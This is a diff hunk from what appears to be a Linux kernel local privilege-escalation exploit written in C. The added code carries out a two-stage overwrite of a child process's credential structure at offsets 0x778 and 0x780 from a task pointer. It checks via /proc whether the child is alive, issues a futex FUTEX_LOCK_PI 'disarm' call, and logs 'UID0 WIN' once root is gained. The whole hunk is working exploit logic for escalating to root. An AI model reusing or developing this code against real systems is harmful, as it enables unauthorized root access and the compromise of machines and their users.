@@ -2547,6 +2547,54 @@ uid0_cred_punch:;
 
   uid0_write_proof(self_uid, self_status, child_uid, status_uid, who, use_task);
 
+  /* DOUBLE PUNCH (09-13): 0x778 real_cred lands ~always but is status-only;
+   * 0x780 subjective never lands alone (0/16). Two-stage on ONE quiet child:
+   * stage 1 (0x778) landed + child still ALIVE -> stage 2 (0x780) completes
+   * the subjective cred. The quiet child self-payloads on getuid()==0. */
+  if (env_flag("UID0_DOUBLE_PUNCH", 0) && !self &&
+      status_uid == 0 && self_uid != 0 && child_uid != 0) {
+    char apath[64];
+    uint32_t alive = 0;
+    snprintf(apath, sizeof(apath), "/proc/%d/stat", (int)child);
+    int afd = open(apath, O_RDONLY);
+    if (afd >= 0) {
+      char st2 = 0;
+      char sb[512];
+      ssize_t rn = read(afd, sb, sizeof(sb) - 1);
+      if (rn > 0) {
+        sb[rn] = 0;
+        char *rp = strrchr(sb, ')');
+        if (rp && rp[1] == ' ')
+          st2 = rp[2];
+      }
+      close(afd);
+      alive = (st2 == 'R' || st2 == 'S');
+    }
+    pr_info("UID0 DOUBLE stage2: child state=%c alive=%u (status_uid=%u) "
+            "-> punching +0x780\n",
+            alive ? 'Y' : '?', alive, status_uid);
+    live_sync_log("UID0", alive ? "double_stage2_go" : "double_stage2_dead");
+    fflush(stdout);
+    if (alive) {
+      g_uid0_slot_idx = 0;
+      uid0_one_store(use_task + 0x780, "child_cred_2nd");
+      /* fresh DISARM for the second ghost */
+      if (!env_flag("UID0_NO_DISARM", 0)) {
+        int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
+        struct timespec dts = { .tv_sec = 0, .tv_nsec = 0 };
+        long dr = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &dts, NULL, 0);
+        pr_info("UID0 DISARM2 ret=%ld errno=%d\n", dr, errno);
+      }
+      usleep(500000); /* quiet child self-payloads on getuid()==0 */
+      child_uid = uid0_child_getuid_query();
+      status_uid = status_uid_of(cpath);
+      self_uid = (uint32_t)getuid();
+      pr_info("UID0 DOUBLE stage2 result: getuid=%u child=%u status=%u\n",
+              self_uid, child_uid, status_uid);
+      fflush(stdout);
+    }
+  }
+
   if (self_uid == 0 || (uint32_t)geteuid() == 0 || child_uid == 0 ||
       self_status == 0 || status_uid == 0) {
     pr_success("UID0 WIN getuid=%u euid=%u self_status=%u child=%u who=%s\n",
